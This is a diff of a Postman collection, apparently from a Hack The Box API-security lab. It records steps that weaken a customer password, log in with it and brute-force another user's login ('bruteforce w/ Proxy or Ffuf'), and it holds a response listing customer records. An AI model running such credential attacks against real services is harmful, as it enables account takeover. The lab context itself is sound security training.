\"YueEvans@gmx.com\",\n            \"phoneNumber\": \"+49 5294 7494839\",\n            \"birthDate\": \"1985-11-27\"\n        },\n        {\n            \"id\": \"fb46fe22-d339-4a3e-8b25-61c0dd43c738\",\n            \"name\": \"Josefina Campbell\",\n            \"email\": \"JosefinaCampbell@tuta.com\",\n            \"phoneNumber\": \"+44 9786 686368\",\n            \"birthDate\": \"1959-11-15\"\n        },\n        {\n            \"id\": \"ed9c6b9d-1353-4bbb-a226-d1cedce02906\",\n            \"name\": \"Alexander Moreno\",\n            \"email\": \"AlexanderMoreno@live.com\",\n            \"phoneNumber\": \"+61 2 7675 8163\",\n            \"birthDate\": \"1964-10-14\"\n        },\n        {\n            \"id\": \"307bad9b-b5d8-4ea1-a0c6-aa8710d1314d\",\n            \"name\": \"Luis Simpson\",\n            \"email\": \"LuisSimpson@aol.com\",\n            \"phoneNumber\": \"+61 5 5098 4072\",\n            \"birthDate\": \"1973-12-03\"\n        },\n        {\n            \"id\": \"5cf56cbd-7a7f-4dcb-8040-fefac4a2057f\",\n            \"name\": \"Francesca Collins\",\n            \"email\": \"FrancescaCollins@outlook.com\",\n            \"phoneNumber\": \"+27 55 790 1586\",\n            \"birthDate\": \"2002-05-04\"\n        },\n        {\n            \"id\": \"8fd842ef-4bb1-4726-be3a-5bc4d4c397e1\",\n            \"name\": \"Kai Russell\",\n            \"email\": \"KaiRussell@mail.com\",\n            \"phoneNumber\": \"+61 3 5246 3260\",\n            \"birthDate\": \"1976-03-25\"\n        },\n        {\n            \"id\": \"ce777863-56ab-4850-a6ab-85f9e17c6dbe\",\n            \"name\": \"Jason Rivera\",\n            \"email\": \"JasonRivera@outlook.com\",\n            \"phoneNumber\": \"+61 8 2056 8771\",\n            \"birthDate\": \"2002-02-14\"\n        },\n        {\n            \"id\": \"6be7ea73-e78c-44d5-bd09-43bfda402f84\",\n            \"name\": \"Kenji Fernandez\",\n            \"email\": \"KenjiFernandez@protonmail.com\",\n            \"phoneNumber\": \"+27 63 462 6871\",\n            \"birthDate\": \"1995-03-13\"\n        },\n        {\n            \"id\": \"3dea1b37-070c-44f6-a2cc-9a148417b179\",\n            \"name\": \"Emeka Kim\",\n            \"email\": \"EmekaKim@gmx.com\",\n            \"phoneNumber\": \"+27 85 132 3011\",\n            \"birthDate\": \"2006-08-29\"\n        },\n        {\n            \"id\": \"2790d3e3-eb20-4aac-969d-4136e3199846\",\n            \"name\": \"Emiko Nichols\",\n            \"email\": \"EmikoNichols@tuta.com\",\n            \"phoneNumber\": \"+55 33 20197-4199\",\n            \"birthDate\": \"1995-03-18\"\n        },\n        {\n            \"id\": \"ea036fa3-e9a3-42ef-81b1-9a04c3f33886\",\n            \"name\": \"Ksenia Webb\",\n            \"email\": \"KseniaWebb@icloud.com\",\n            \"phoneNumber\": \"+27 15 394 1343\",\n            \"birthDate\": \"1984-07-07\"\n        },\n        {\n            \"id\": \"246472d4-4108-43e1-8ddd-70ca0d8a9ed6\",\n            \"name\": \"Abigail Moore\",\n            \"email\": \"AbigailMoore@gmail.com\",\n            \"phoneNumber\": \"+61 7 2847 9853\",\n            \"birthDate\": \"1983-02-03\"\n        },\n        {\n            \"id\": \"edd1d0ae-90ec-4955-8612-c904f86c3188\",\n            \"name\": \"Aria Mendez\",\n            \"email\": \"AriaMendez@ymail.com\",\n            \"phoneNumber\": \"+44 4893 165994\",\n            \"birthDate\": \"1984-08-02\"\n        },\n        {\n            \"id\": \"5f4ee06d-b0a7-4e45-a7cf-9efdd6690e0f\",\n            \"name\": \"Alejandro Weaver\",\n            \"email\": \"AlejandroWeaver@tuta.com\",\n            \"phoneNumber\": \"+49 7280 9912347\",\n            \"birthDate\": \"2004-01-17\"\n        },\n        {\n            \"id\": \"f562a14e-8228-4518-8cb5-6f50ac6c65ed\",\n            \"name\": \"Lucia Jenkins\",\n            \"email\": \"LuciaJenkins@aol.com\",\n            \"phoneNumber\": \"(306) 709-3021\",\n            \"birthDate\": \"1993-05-22\"\n        },\n        {\n            \"id\": \"031ffc3f-8a8d-4a27-8ffe-c8f14aeda7a4\",\n            \"name\": \"Avery Morgan\",\n            \"email\": \"AveryMorgan@live.com\",\n            \"phoneNumber\": \"+49 4758 3493647\",\n            \"birthDate\": \"1983-01-08\"\n        },\n        {\n            \"id\": \"896aa676-d90a-45bf-9139-4c1a1dbfdbc0\",\n            \"name\": \"Cruz Long\",\n            \"email\": \"CruzLong@tuta.com\",\n            \"phoneNumber\": \"+27 73 472 7587\",\n            \"birthDate\": \"1998-04-29\"\n        },\n        {\n            \"id\": \"f5ef4cd0-d253-465b-bd2a-56c36627d760\",\n            \"name\": \"Adebayo Gomez\",\n            \"email\": \"AdebayoGomez@tuta.com\",\n            \"phoneNumber\": \"+49 3407 2267241\",\n            \"birthDate\": \"1994-04-01\"\n        },\n        {\n            \"id\": \"cc2d5636-879e-4c1c-b245-789c753a9aea\",\n            \"name\": \"Zane Sanchez\",\n            \"email\": \"ZaneSanchez@yahoo.com\",\n            \"phoneNumber\": \"+55 97 56222-7003\",\n            \"birthDate\": \"1964-01-28\"\n        },\n        {\n            \"id\": \"c3fa54cb-b9a8-405b-aeb9-8eb5295ea5a2\",\n            \"name\": \"Afolabi Medina\",\n            \"email\": \"AfolabiMedina@tuta.com\",\n            \"phoneNumber\": \"+27 45 353 4727\",\n            \"birthDate\": \"1961-01-17\"\n        },\n        {\n            \"id\": \"623c8a78-f776-43b9-9162-edf53985ca4b\",\n            \"name\": \"Abigail Walker\",\n            \"email\": \"AbigailWalker@mail.com\",\n            \"phoneNumber\": \"+55 40 82792-9813\",\n            \"birthDate\": \"1976-12-20\"\n        },\n        {\n            \"id\": \"345f7f82-4c77-4560-958c-46cc91bceceb\",\n            \"name\": \"Barrett Carter\",\n            \"email\": \"BarrettCarter@fastmail.com\",\n            \"phoneNumber\": \"+44 2338 768719\",\n            \"birthDate\": \"2002-08-28\"\n        },\n        {\n            \"id\": \"226560da-37c3-49ec-86b1-8e595be5671d\",\n            \"name\": \"Yuto Silva\",\n            \"email\": \"YutoSilva@aol.com\",\n            \"phoneNumber\": \"+61 1 8438 1508\",\n            \"birthDate\": \"2005-02-08\"\n        },\n        {\n            \"id\": \"ff7166c7-c171-4f02-bd40-2eb52baceda7\",\n            \"name\": \"Zane Murphy\",\n            \"email\": \"ZaneMurphy@yahoo.com\",\n            \"phoneNumber\": \"+49 3676 5707162\",\n            \"birthDate\": \"1992-11-22\"\n        },\n        {\n            \"id\": \"d281181d-f8fe-4aef-b473-2246faf096a5\",\n            \"name\": \"Akira Mason\",\n            \"email\": \"AkiraMason@yahoo.com\",\n            \"phoneNumber\": \"(141) 499-5975\",\n            \"birthDate\": \"2007-11-01\"\n        },\n        {\n            \"id\": \"9e681d84-a7de-4808-baa7-e5ad0e32d2e5\",\n            \"name\": \"Lucy Ruiz\",\n            \"email\": \"LucyRuiz@tuta.com\",\n            \"phoneNumber\": \"+55 40 93107-5560\",\n            \"birthDate\": \"1990-04-12\"\n        },\n        {\n            \"id\": \"66068634-ecb5-4ff2-a972-08406316b74a\",\n            \"name\": \"Adriana Hunt\",\n            \"email\": \"AdrianaHunt@aol.com\",\n            \"phoneNumber\": \"+27 37 836 5089\",\n            \"birthDate\": \"1960-02-13\"\n        },\n        {\n            \"id\": \"53428a83-8591-4548-a553-c434ad76a61a\",\n            \"name\": \"Mason Jenkins\",\n            \"email\": \"MasonJenkins@ymail.com\",\n            \"phoneNumber\": \"+44 7451 162707\",\n            \"birthDate\": \"1985-09-16\"\n        },\n        {\n            \"id\": \"897a4565-870f-4d88-bbee-292f91623aa4\",\n            \"name\": \"Penelope Morris\",\n            \"email\": \"PenelopeMorris@gmail.com\",\n            \"phoneNumber\": \"+44 1439 862501\",\n            \"birthDate\": \"1980-09-10\"\n        },\n        {\n            \"id\": \"29c30c95-8c70-4eaa-bda9-752b8a489d32\",\n            \"name\": \"Ming Scott\",\n            \"email\": \"MingScott@icloud.com\",\n            \"phoneNumber\": \"+55 69 49207-2986\",\n            \"birthDate\": \"2005-02-17\"\n        },\n        {\n            \"id\": \"cbc79cac-2454-4b0c-9997-1928381e090c\",\n            \"name\": \"Zoe Bailey\",\n            \"email\": \"ZoeBailey@mail.com\",\n            \"phoneNumber\": \"+55 64 18428-6949\",\n            \"birthDate\": \"1998-05-24\"\n        },\n        {\n            \"id\": \"1efb730d-9b12-4572-a781-4840f37b008f\",\n            \"name\": \"Martina Sullivan\",\n            \"email\": \"MartinaSullivan@yandex.com\",\n            \"phoneNumber\": \"(764) 643-8801\",\n            \"birthDate\": \"2007-11-20\"\n        },\n        {\n            \"id\": \"86276779-611e-47d6-b36f-4ddccf657d68\",\n            \"name\": \"Yue McDonald\",\n            \"email\": \"YueMcDonald@protonmail.com\",\n            \"phoneNumber\": \"(972) 841-3112\",\n            \"birthDate\": \"2004-12-03\"\n        },\n        {\n            \"id\": \"e70fccce-93cf-48e5-b4bb-866377b0a3bc\",\n            \"name\": \"Ethan Stewart\",\n            \"email\": \"EthanStewart@tuta.com\",\n            \"phoneNumber\": \"+27 46 194 4542\",\n            \"birthDate\": \"1984-04-20\"\n        },\n        {\n            \"id\": \"4d8a6764-c2cd-4806-b539-fb9b1d82fd8d\",\n            \"name\": \"Easton Scott\",\n            \"email\": \"EastonScott@live.com\",\n            \"phoneNumber\": \"+27 28 173 4975\",\n            \"birthDate\": \"1968-07-19\"\n        },\n        {\n            \"id\": \"cc8cd08d-b583-454d-999b-84f54fe55553\",\n            \"name\": \"Mei Torres\",\n            \"email\": \"MeiTorres@zoho.com\",\n            \"phoneNumber\": \"+55 21 27102-6381\",\n            \"birthDate\": \"1987-04-15\"\n        },\n        {\n            \"id\": \"3237aaab-04ca-458e-a8d1-d67222da1cdc\",\n            \"name\": \"Hana Harris\",\n            \"email\": \"HanaHarris@outlook.com\",\n            \"phoneNumber\": \"(138) 524-7694\",\n            \"birthDate\": \"1988-12-22\"\n        },\n        {\n            \"id\": \"d2d441cc-4872-4bd7-be7f-84650d206390\",\n            \"name\": \"Tristan Reed\",\n            \"email\": \"TristanReed@hotmail.com\",\n            \"phoneNumber\": \"+27 58 886 3612\",\n            \"birthDate\": \"1959-12-29\"\n        },\n        {\n            \"id\": \"a794cbea-a088-408e-8e22-b9b9ac0fb430\",\n            \"name\": \"Emmett Brooks\",\n            \"email\": \"EmmettBrooks@tuta.com\",\n            \"phoneNumber\": \"+49 8303 6438018\",\n            \"birthDate\": \"1995-04-28\"\n        },\n        {\n            \"id\": \"35aedb35-75cb-4442-ae0c-ee83b04b2d86\",\n            \"name\": \"Natalie Hunter\",\n            \"email\": \"NatalieHunter@live.com\",\n            \"phoneNumber\": \"+55 62 19634-5547\",\n            \"birthDate\": \"1991-03-06\"\n        },\n        {\n            \"id\": \"92a30c91-6996-4e6e-8f3a-1a60e13caa0d\",\n            \"name\": \"Lennox Gonzalez\",\n            \"email\": \"LennoxGonzalez@live.com\",\n            \"phoneNumber\": \"+44 3262 691416\",\n            \"birthDate\": \"1963-03-08\"\n        },\n        {\n            \"id\": \"ce9467d9-3aea-4cd9-849f-964b44d67926\",\n            \"name\": \"Andrew Castro\",\n            \"email\": \"AndrewCastro@aol.com\",\n            \"phoneNumber\": \"+49 2880 4617562\",\n            \"birthDate\": \"1995-01-10\"\n        },\n        {\n            \"id\": \"5662665b-fd18-4690-9ca7-6bd20c600edd\",\n            \"name\": \"Irina Soto\",\n            \"email\": \"IrinaSoto@yandex.com\",\n            \"phoneNumber\": \"+27 22 272 9694\",\n            \"birthDate\": \"1977-10-08\"\n        },\n        {\n            \"id\": \"dba419a4-b075-41ee-a1c9-8b442158b87f\",\n            \"name\": \"Maxwell Graham\",\n            \"email\": \"MaxwellGraham@outlook.com\",\n            \"phoneNumber\": \"(366) 149-8825\",\n            \"birthDate\": \"1993-01-16\"\n        },\n        {\n            \"id\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n            \"name\": \"HTBPentester3\",\n            \"email\": \"htbpentester3@hackthebox.com\",\n            \"phoneNumber\": \"+44 9999 999993\",\n            \"birthDate\": \"1995-06-21\"\n        },\n        {\n            \"id\": \"d8fc353e-8110-4817-b2dc-73ffa3fc87bf\",\n            \"name\": \"HTBPentester4\",\n            \"email\": \"htbpentester4@hackthebox.com\",\n            \"phoneNumber\": \"+44 9999 999994\",\n            \"birthDate\": \"1995-06-21\"\n        },\n        {\n            \"id\": \"bb2a58c9-da26-4125-8638-ba960c7a5ab0\",\n            \"name\": \"HTBPentester5\",\n            \"email\": \"htbpentester5@hackthebox.com\",\n            \"phoneNumber\": \"+44 9999 999995\",\n            \"birthDate\": \"1995-06-21\"\n        },\n        {\n            \"id\": \"123b878e-6b8a-425f-bd5e-3ba415ce8727\",\n            \"name\": \"HTBPentester7\",\n            \"email\": \"htbpentester7@hackthebox.com\",\n            \"phoneNumber\": \"+44 9998 999997\",\n            \"birthDate\": \"1995-06-21\"\n        },\n        {\n            \"id\": \"1ce0e242-c6a4-4c15-816b-19e95a9654bf\",\n            \"name\": \"HTBPentester9\",\n            \"email\": \"htbpentester9@hackthebox.com\",\n            \"phoneNumber\": \"+44 9998 999999\",\n            \"birthDate\": \"1995-06-21\"\n        },\n        {\n            \"id\": \"c87da3ce-daa5-4f76-bf7e-a6ee652b77c1\",\n            \"name\": \"HTBPentester13\",\n            \"email\": \"htbpentester13@hackthebox.com\",\n            \"phoneNumber\": \"+44 9998 999994\",\n            \"birthDate\": \"1995-06-21\"\n        }\n    ]\n}"
+						}
+					]
+				},
+				{
+					"name": "5. update password to weak 4-char",
+					"request": {
+						"method": "PATCH",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{customer_fresh_jwt}}",
+								"type": "default"
+							},
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "default"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"UpdatedCustomer\": {\n        \"id\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n        \"name\": \"HTBPentester3\",\n        \"email\": \"htbpentester3@hackthebox.com\",\n        \"phoneNumber\": \"+44 9999 999993\",\n        \"birthDate\": \"1995-06-21\",\n        \"Password\": \"1234\"\n    }\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/customers/current-user",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"customers",
+								"current-user"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "400 | using customer",
+							"originalRequest": {
+								"method": "PATCH",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default"
+									},
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "default"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"customer\": {\n        \"id\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n        \"name\": \"HTBPentester3\",\n        \"email\": \"htbpentester3@hackthebox.com\",\n        \"phoneNumber\": \"+44 9999 999993\",\n        \"birthDate\": \"1995-06-21\"\n    }\n}"
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/customers/current-user",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"customers",
+										"current-user"
+									]
+								}
+							},
+							"status": "Bad Request",
+							"code": 400,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/problem+json"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 19:02:04 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "264"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"StatusCode\": 400,\n    \"Message\": \"One or more errors occurred!\",\n    \"Errors\": {\n        \"SerializerErrors\": [\n            \"JSON deserialization for type 'API_Attacks.Entities.Commands.UpdateCustomerByCurrentUserCommand' was missing required properties, including the following: UpdatedCustomer\"\n        ]\n    }\n}"
+						},
+						{
+							"name": "400 | using UpdatedCustomer w/o Password",
+							"originalRequest": {
+								"method": "PATCH",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default"
+									},
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "default"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"UpdatedCustomer\": {\n        \"id\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n        \"name\": \"HTBPentester3\",\n        \"email\": \"htbpentester3@hackthebox.com\",\n        \"phoneNumber\": \"+44 9999 999993\",\n        \"birthDate\": \"1995-06-21\"\n    }\n}"
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/customers/current-user",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"customers",
+										"current-user"
+									]
+								}
+							},
+							"status": "Bad Request",
+							"code": 400,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/problem+json"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 19:02:32 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "255"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"StatusCode\": 400,\n    \"Message\": \"One or more errors occurred!\",\n    \"Errors\": {\n        \"UpdatedCustomer\": [\n            \"JSON deserialization for type 'API_Attacks.Entities.DTOs.UpdateCustomerByCurrentUserCommandDTO' was missing required properties, including the following: Password\"\n        ]\n    }\n}"
+						},
+						{
+							"name": "400 | pass length too short, also multiple errors",
+							"originalRequest": {
+								"method": "PATCH",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default"
+									},
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "default"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"UpdatedCustomer\": {\n        \"id\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n        \"name\": \"HTBPentester3\",\n        \"email\": \"htbpentester3@hackthebox.com\",\n        \"phoneNumber\": \"+44 9999 999993\",\n        \"birthDate\": \"1995-06-21\",\n        \"Password\": \"1234\"\n    }\n}"
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/customers/current-user",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"customers",
+										"current-user"
+									]
+								}
+							},
+							"status": "Bad Request",
+							"code": 400,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/problem+json"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 19:05:18 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "241"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"StatusCode\": 400,\n    \"Message\": \"One or more errors occurred!\",\n    \"Errors\": {\n        \"UpdatedCustomer.PhoneNumber\": [\n            \"'Updated Customer Phone Number' is not in the correct format.\"\n        ],\n        \"UpdatedCustomer.Password\": [\n            \"Password must be at least 6 characters long\"\n        ]\n    }\n}"
+						}
+					]
+				},
+				{
+					"name": "6. update password to weak 6-char",
+					"request": {
+						"method": "PATCH",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{customer_fresh_jwt}}",
+								"type": "default"
+							},
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "default"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"UpdatedCustomer\": {\n        \"id\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n        \"name\": \"HTBPentester3\",\n        \"email\": \"htbpentester3@hackthebox.com\",\n        \"phoneNumber\": \"449999999993\",\n        \"birthDate\": \"1995-06-21\",\n        \"Password\": \"123456\"\n    }\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/customers/current-user",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"customers",
+								"current-user"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "400 | expects more fields",
+							"originalRequest": {
+								"method": "PATCH",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default"
+									},
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "default"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"UpdatedCustomer\": {\n        \"Password\": \"123456\"\n    }\n}"
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/customers/current-user",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"customers",
+										"current-user"
+									]
+								}
+							},
+							"status": "Bad Request",
+							"code": 400,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/problem+json"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 19:09:10 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "282"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"StatusCode\": 400,\n    \"Message\": \"One or more errors occurred!\",\n    \"Errors\": {\n        \"UpdatedCustomer\": [\n            \"JSON deserialization for type 'API_Attacks.Entities.DTOs.UpdateCustomerByCurrentUserCommandDTO' was missing required properties, including the following: Name, Email, PhoneNumber, BirthDate\"\n        ]\n    }\n}"
+						},
+						{
+							"name": "400 | phone number wrong format",
+							"originalRequest": {
+								"method": "PATCH",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default"
+									},
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "default"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"UpdatedCustomer\": {\n        \"id\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n        \"name\": \"HTBPentester3\",\n        \"email\": \"htbpentester3@hackthebox.com\",\n        \"phoneNumber\": \"+44 9999 999993\",\n        \"birthDate\": \"1995-06-21\",\n        \"Password\": \"123456\"\n    }\n}"
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/customers/current-user",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"customers",
+										"current-user"
+									]
+								}
+							},
+							"status": "Bad Request",
+							"code": 400,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/problem+json"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 19:09:39 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "166"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"StatusCode\": 400,\n    \"Message\": \"One or more errors occurred!\",\n    \"Errors\": {\n        \"UpdatedCustomer.PhoneNumber\": [\n            \"'Updated Customer Phone Number' is not in the correct format.\"\n        ]\n    }\n}"
+						},
+						{
+							"name": "200 | update success",
+							"originalRequest": {
+								"method": "PATCH",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default"
+									},
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "default"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"UpdatedCustomer\": {\n        \"id\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n        \"name\": \"HTBPentester3\",\n        \"email\": \"htbpentester3@hackthebox.com\",\n        \"phoneNumber\": \"449999999993\",\n        \"birthDate\": \"1995-06-21\",\n        \"Password\": \"123456\"\n    }\n}"
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/customers/current-user",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"customers",
+										"current-user"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/json; charset=utf-8"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 19:11:07 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "22"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"successStatus\": true\n}"
+						}
+					]
+				},
+				{
+					"name": "7. login w/ new pass | bruteforce w/ Proxy or Ffuf",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript"
+							}
+						}
 					],
-					"path": [
-						"api",
-						"v1",
-						"authentication",
-						"suppliers",
-						"sign-in"
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "default"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"Email\": \"IsabellaRichardson@gmail.com\",\n    \"Password\": \"qwerasdfzxcv\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/authentication/customers/sign-in",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"authentication",
+								"customers",
+								"sign-in"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "8. login w/ bruteforced creds",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "default"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"Email\": \"htbpentester3@hackthebox.com\",\n    \"Password\": \"123456\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/authentication/customers/sign-in",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"authentication",
+								"customers",
+								"sign-in"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "[fail] change pass back to orig",
+					"request": {
+						"method": "PATCH",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{customer_fresh_jwt}}",
+								"type": "default"
+							},
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "default"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"UpdatedCustomer\": {\n        \"id\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n        \"name\": \"HTBPentester3\",\n        \"email\": \"htbpentester3@hackthebox.com\",\n        \"phoneNumber\": \"449999999993\",\n        \"birthDate\": \"1995-06-21\",\n        \"Password\": \"HTBPentester3\"\n    }\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/customers/current-user",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"customers",
+								"current-user"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "weird: rejected even if met criteria",
+							"originalRequest": {
+								"method": "PATCH",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default"
+									},
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "default"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"UpdatedCustomer\": {\n        \"id\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n        \"name\": \"HTBPentester3\",\n        \"email\": \"htbpentester3@hackthebox.com\",\n        \"phoneNumber\": \"449999999993\",\n        \"birthDate\": \"1995-06-21\",\n        \"Password\": \"HTBPentester3\"\n    }\n}"
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/customers/current-user",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"customers",
+										"current-user"
+									]
+								}
+							},
+							"status": "Bad Request",
+							"code": 400,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/problem+json"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 19:15:25 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "145"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"StatusCode\": 400,\n    \"Message\": \"One or more errors occurred!\",\n    \"Errors\": {\n        \"UpdatedCustomer.Password\": [\n            \"Password must be at least 6 characters long\"\n        ]\n    }\n}"
+						}
 					]
 				}
-			},
-			"response": []
+			]
 		},
 		{
-			"name": "suppliers | quarterly report",
-			"request": {
-				"method": "GET",
-				"header": [
-					{
-						"key": "accept",
-						"value": "application/json"
-					},
-					{
-						"key": "Authorization",
